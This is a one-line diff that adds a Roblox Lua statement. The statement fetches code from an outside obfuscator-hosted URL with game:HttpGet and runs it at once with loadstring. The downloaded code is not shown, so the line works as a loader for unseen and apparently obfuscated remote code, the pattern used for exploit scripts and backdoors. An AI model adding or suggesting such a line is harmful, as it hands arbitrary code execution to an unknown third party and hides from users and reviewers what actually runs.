@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://obfuscatorhub.vercel.app/api/sn2uiyl4"))()
